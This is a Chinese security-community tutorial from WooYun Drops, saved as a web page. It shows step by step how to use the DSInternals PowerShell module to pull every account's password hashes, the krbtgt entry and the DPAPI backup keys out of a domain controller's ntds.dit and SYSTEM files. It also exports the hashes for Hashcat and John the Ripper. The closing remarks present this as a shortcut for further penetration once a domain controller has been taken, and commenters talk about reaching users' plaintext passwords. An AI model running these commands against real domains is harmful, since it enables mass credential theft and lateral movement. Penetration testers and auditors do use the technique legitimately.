@@ -1,0 +1,77 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">利用Powershell快速导出域控所有用户Hash</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">三好学生</a> <span class="bull">·</span> <time title="2015/11/04 10:28" ui-time="" datetime="2015/11/04 10:28" class="published ng-binding ng-isolate-scope">2015/11/04 10:28</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>之前在《导出当前域内所有用户hash的技术整理》中测试了5种导出域内所有用户hash的方法，经过这一段时间的学习和实践，找到了新的方法，也很有效，分享给大家。</p><h1>0x01 简介</h1><hr><p>对于离线导出域控所有用户Hash，NTDSXtract依旧是主流</p><p><strong>优点：</strong></p><pre><code>获取信息全面
+稳定，上G的ntds.dit文件也可以正常解析
+</code></pre><p><strong>缺点：</strong></p><pre><code>耗时，对于大型数据库，解析效率低
+不支持内置索引，对于大型数据库，查找特定对象效率低
+运行在Linux，不支持windows
+无法修改ntds的数据库
+</code></pre><p>但就在最近，能够综合解决上述问题的工具出现了，经过一段时间的测试和使用，个人认为已经可以替代NTDSXtract</p><p>下面就介绍一下今天的主角——DSInternals PowerShell Module</p><p><strong>下载地址：</strong></p><p>DSInternals PowerShell Module:<br><a href="https://www.dsinternals.com/wp-content/uploads/DSInternals_v2.8.zip">https://www.dsinternals.com/wp-content/uploads/DSInternals_v2.8.zip</a></p><p>《导出当前域内所有用户hash的技术整理》:<br><a href="http://drops.wooyun.org/tips/6617">http://drops.wooyun.org/tips/6617</a></p><h1>0x02 DSInternals PowerShell Module介绍</h1><hr><h2>1、版本</h2><pre><code>v2.8
+</code></pre><h2>2、适用环境</h2><p><strong>支持系统：</strong></p><pre><code>Windows Server 2012 R2
+Windows Server 2008 R2
+Windows 10 64-bit
+Windows 8.1 64-bit
+Windows 7 64-bit
+（以上为官方说明）
+</code></pre><p><strong>注：</strong></p><pre><code>实际测试32位也可以
+Windows 7 、Windows Server 2008 R2默认环境下PowerShell版本2.0，不支持
+PowerShell版本需要升级至3.0
+</code></pre><p><strong>软件版本：</strong></p><pre><code>- Windows PowerShell 3+
+- .NET Framework 4.5+
+（此为官方说明）
+</code></pre><p><strong>注：</strong></p><pre><code>实测.NET Framework 4.0即可
+</code></pre><h2>3、安装方法</h2><p><strong>1、PowerShell 5.0：</strong></p><pre><code>Install-Module DSInternals
+</code></pre><p><strong>2、PowerShell 3.0、4.0</strong></p><pre><code>解压压缩包
+cd C:\test\DSInternals
+Import-Module .\DSInternals
+</code></pre><h2>4、功能模块</h2><p><strong>1、</strong>在线操作活动目录数据库</p><pre><code>Get-ADReplAccount：读取账户信息
+Set-SamAccountPasswordHash：设置账户的NTHash和LMHash
+Get-ADReplBackupKey：读取DPAPI backup keys
+</code></pre><p><strong>2、</strong>离线操作活动目录数据库</p><pre><code>Get-ADDBAccount：从ntds.dit文件读取账户信息
+Get-BootKey：从SYSTEM文件读取BootKey
+Get-ADDBBackupKey：：从ntds.dit文件读取DPAPI backup keys
+Add-ADDBSidHistory：向ntds.dit文件添加SIDHistory信息
+Set-ADDBPrimaryGroup：修改ntds.dit文件的primaryGroupId属性
+Get-ADDBDomainController：从ntds.dit文件读取域控信息，包括domain name, domain SID, DC name and DC site.
+Set-ADDBDomainController：向ntds.dit文件添加域控信息
+Get-ADDBSchemaAttribute：从ntds.dit文件读取AD schema，包括数据表的列名
+Remove-ADDBObject：从ntds.dit文件移除特定对象
+</code></pre><p><strong>3、</strong> Hash计算</p><pre><code>ConvertTo-NTHash：给定密码，计算NT hash
+ConvertTo-LMHash：给定密码，计算LM hash
+ConvertTo-OrgIdHash：给定密码，计算OrgId hash
+</code></pre><p><strong>4、</strong>补充</p><p>对于Get-ADDBAccount读取到的账户信息，可将其中包含的Hash值按如下格式导出：</p><pre><code>HashcatNT：支持Hashcat的NT hash
+HashcatLM：支持Hashcat的LM hash
+JohnNT：支持John the Ripper的NT hash
+JohnLM：支持John the Ripper的LM hash
+Ophcrack：支持Ophcrack的NT hash、LM hash
+</code></pre><p><strong>注：</strong></p><pre><code>列出以上三款Hash破解工具的地址：
+Hashcat：
+http://hashcat.net/oclhashcat/
+John the Ripper：
+http://www.openwall.com/john/
+Ophcrack：
+http://ophcrack.sourceforge.net/
+</code></pre><h1>0x03 测试环境</h1><hr><p>操作系统：</p><pre><code>win10 x64
+</code></pre><p>Powershell版本：</p><pre><code>v5
+</code></pre><p>需要文件：</p><pre><code>ntds.dit
+SAM
+SYSTEM
+</code></pre><p>文件来源：</p><pre><code>域控：server2008R2
+</code></pre><p>导出方法：</p><pre><code>vssown.vbs或ShadowCopy（之前文章有介绍，导出过程略过）
+</code></pre><h1>0x04 实际测试</h1><hr><h2>1、安装配置</h2><p>下载DSInternals PowerShell Module</p><p>允许Powershell执行脚本：</p><pre><code>Set-ExecutionPolicy Unrestricted
+</code></pre><p>安装DSInternals：</p><pre><code>Install-Module -Name DSInternals
+</code></pre><p>导入DSInternals：</p><pre><code>Import-Module DSInternals
+</code></pre><h2>2、获取所有账户信息</h2><pre><code>$key = Get-BootKey -SystemHivePath 'C:\Users\a\Desktop\a\SYSTEM'
+
+Get-ADDBAccount -All -DBPath 'C:\Users\a\Desktop\a\ntds.dit' -BootKey $key 
+</code></pre><p>如图</p><p><img alt="这里写图片描述" img-src="a426718d11cdea15ddcd766348ece719dd272fa7.jpg"></p><p><img alt="这里写图片描述" img-src="3ec58515542b375dae0c1684a38075b6004133a1.jpg"></p><p><img alt="这里写图片描述" img-src="5d14ad2776e5c797625f6784e7f7f73e93ec3bb5.jpg"></p><p><img alt="这里写图片描述" img-src="56f2dd63822c256363cab04c3d274b6976d5dc23.jpg"></p><p><img alt="这里写图片描述" img-src="da3ddf81b2c18d76b3be719162c626479134171f.jpg"></p><h2>3、获取指定账户信息</h2><pre><code>$key = Get-BootKey -SystemHivePath 'C:\Users\a\Desktop\a\SYSTEM'
+
+Get-ADDBAccount -DistinguishedName 'CN=krbtgt,CN=Users,DC=test,DC=local'  -DBPath 'C:\Users\a\Desktop\a\ntds.dit' -BootKey $key
+</code></pre><p>如图</p><p><img alt="这里写图片描述" img-src="f24b8d3c7ff14bf806e5c8e0ccb2d1f143e50dd9.jpg"></p><h2>4、导出支持Hashcat的NT hash</h2><pre><code>Get-ADDBAccount -All -DBPath 'C:\Users\a\Desktop\a\ntds.dit' -BootKey $key | Format-Custom -View HashcatNT | Out-File hashes.txt
+</code></pre><p>如图</p><p><img alt="这里写图片描述" img-src="87fab038e7b5c0744d9891724ec05a8c97620438.jpg"></p><h2>5、导出DPAPI backup keys</h2><p><strong>（1）</strong>获得BootKey</p><pre><code>Get-BootKey -SystemHiveFilePath 'C:\Users\a\Desktop\a\SYSTEM'
+得到c76034ff820edbc012308a258faf3d26
+</code></pre><p>如图</p><p><img alt="这里写图片描述" img-src="79c98f722d7950bd20c62c106b42bdbb2d1ab6a2.jpg"></p><p><strong>（2）</strong>解密得到DPAPI backup keys</p><pre><code>Get-ADDBBackupKey -DBPath 'C:\Users\a\Desktop\a\ntds.dit'  -BootKey c76034ff820edbc012308a258faf3d26 |  Format-List
+</code></pre><p><strong>（3）</strong>导出到文件</p><pre><code>Get-ADDBBackupKey -DBPath 'C:\Users\a\Desktop\a\ntds.dit' -BootKey c76034ff820edbc012308a258faf3d26 | Save-DPAPIBlob -DirectoryPath .\Keys
+</code></pre><h2>6、Hash计算</h2><pre><code>$pwd = ConvertTo-SecureString 'TestTest' -AsPlainText -Force
+ConvertTo-NTHash $pwd
+ConvertTo-LMHash $pwd
+ConvertTo-OrgIdHash -NTHash 'd280553f0103f2e643406517296e7582'
+</code></pre><p>如图</p><p><img alt="这里写图片描述" img-src="9da0c6e21bb3171441d83d8f7adeb61b797f9872.jpg"></p><h1>0x05 小结</h1><hr><p>随着技术的发展，效率一直在提高</p><p>在获取域控权限下，导出所有用户hash的方法越来越简便，当域控被攻陷后，可以在很短的时间内提取出有用的信息用来进一步渗透，内网渗透将会越来越有趣。</p><p>本文由三好学生原创并首发于乌云drops，转载请注明</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/6199" rel="bookmark" id="re1">powershell各种反弹姿势以及取证（二）</a></li><li><a href="http://drops.wooyun.org/tips/11631" rel="bookmark" id="re2">域渗透——Pass The Hash &amp; Pass The Key</a></li><li><a href="http://drops.wooyun.org/tips/6090" rel="bookmark" id="re3">powershell各种反弹姿势以及取证（一）</a></li><li><a href="http://drops.wooyun.org/tips/3353" rel="bookmark" id="re4">Powershell tricks::Bypass AV</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2015-11-24 11:20:52</span></div><p></p><p>@hell0w0rld ps2基于.NET framework 3.5，其安全模型同4.0+有很大的不同，作者不打算更新使其支持2.0，但等他发布源码后可以尝试修改支持低版本ps，导出ntds.dit也可以用powershell实现——NinjaCopy，当然，ps2就可以</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">hell0w0rld</span> <span class="reply-time">2015-11-24 09:51:31</span></div><p></p><p>看了下 win7 32 默认都是ps2 很多都不支持啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Thorns</span> <span class="reply-time">2015-11-10 18:06:04</span></div><p></p><p>表哥威武，果然神器。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Her0in</span> <span class="reply-time">2015-11-04 20:19:44</span></div><p></p><p>膜拜【三好大牛】！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">test</span> <span class="reply-time">2015-11-04 14:53:11</span></div><p></p><p>终极目标 提取域内所有用户的明文密码。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2015-11-04 14:44:49</span></div><p></p><p>@浮生 效率挺高了不是一两点</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">wy007</span> <span class="reply-time">2015-11-04 14:20:04</span></div><p></p><p>以后用PowerShell就可以直接搞域了，很方便！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2015-11-04 11:58:24</span></div><p></p><p>666666</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">浮生</span> <span class="reply-time">2015-11-04 11:49:31</span></div><p></p><p>好处大概就是不用拖ntds了，毕竟那东西和这个比，太大了</p><p></p></div></div></div></div></div></main>
